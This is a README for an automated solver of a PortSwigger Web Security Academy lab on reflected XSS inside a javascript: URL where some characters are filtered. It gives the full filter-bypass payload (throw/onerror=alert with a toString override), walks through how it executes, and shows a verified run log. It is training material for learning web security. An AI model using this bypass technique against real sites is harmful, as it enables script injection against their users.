# Reflected XSS in a JavaScript URL with some characters blocked

**Difficulty:** EXPERT · **Topic:** Cross-site scripting → Contexts · **Lab:** [Academy page](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)

Automated solver for the PortSwigger Web Security Academy lab whose blog
"Back to Blog" link is built out of the current query string inside a
`javascript:` URL.

## Objective

Perform a reflected XSS attack that calls `alert` with `1337` somewhere in the
message.

## Vulnerability in one line

The whole query string is spliced into a single-quoted JavaScript string inside
a `javascript:` URL, and the application's "hardening" is a character filter —
not a JavaScript sanitiser — so any payload that avoids the deleted characters
escapes the string.

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d1'}).finally(_ => window.location = '/')">Back to Blog</a>
```

Appending `&` plus our own text puts it inside `body:'/post?postId=1&…'`.

## Exploit

```
/post?postId=<postId>&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

The browser percent-decodes the `javascript:` URL before evaluating it, so the
served, escaped form (`%27`, `%3d`, `%3e`, `%2b`) executes as:

```js
fetch('/analytics', {method:'post',body:'/post?postId=1&'},
      x=x=>{throw/**/onerror=alert,1337}, toString=x, window+'', {x:''})
  .finally(_ => window.location = '/')
```

`throw` is a statement, so it is wrapped in an arrow function, that function is
assigned to `window.toString`, and `window + ''` forces the conversion. The
throw reaches `onerror = alert`, which receives a message containing `1337`.
`/**/` substitutes for the blocked space.

`alert` fires when the victim clicks **Back to Blog**. The lab's own checker is
server-side and flips to *Solved* as soon as the crafted URL is requested — no
exploit server exists on this instance (`GET /exploit` → 404).

## Usage

```bash
cd EXPERT/Reflected-XSS-in-a-JavaScript-URL-with-some-characters-blocked
uv run python solve.py --url "https://<lab-id>.web-security-academy.net"

# print the crafted URL without sending it (for a manual browser check)
uv run python solve.py --url "https://<lab-id>.web-security-academy.net" --show-url
```

Exit codes: `0` verified solved · `1` exploit sent, lab not solved ·
`2` usage/environment · `3` lab unreachable/expired.

## What the solver does

1. `GET /` — verifies the page `<title>` is this lab, records the authoritative
   `widgetcontainer-lab-status` baseline, discovers a real post id from the blog
   listing.
2. `GET /post?postId=<id>` — reads the generated `javascript:fetch(...)` link and
   proves the query string is reflected into the `body:'…'` string, deriving the
   injection point from live markup.
3. Control request with `AL(1)[2]%3b` — asserts `(`, `)`, `[`, `]` really are
   deleted by the filter, i.e. the payload must be parenthesis-free.
4. Exploit request — asserts the reflected `javascript:` URL percent-decodes back
   to intact code containing `throw/**/onerror=alert,1337`.
5. Polls `GET /` until the widget reports `is-solved` / `Solved`, then reports
   request count and elapsed time.

Nothing instance-specific is hardcoded: host, post id and reflected prefix all
come from `--url` and the live responses.

## Verified run

```
[   1.8s] injected href   : javascript:fetch('/analytics', {method:'post',body:'/post?postId=1&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ => window.location = '/')
lab status      : SOLVED
HTTP requests   : 6
elapsed         : 2.2s
```

Launcher from the repository root: exact folder-name match, exit 0, 2.6 s total.
Browser check: clicking *Back to Blog* fires `alert` with `Uncaught 1337`.

See `SOLUTION.md` for the reproducible steps, `REPORT.md` for the full case
study, and `RESUME.md` / `LESSONS_LEARNED.md` for the working notes.
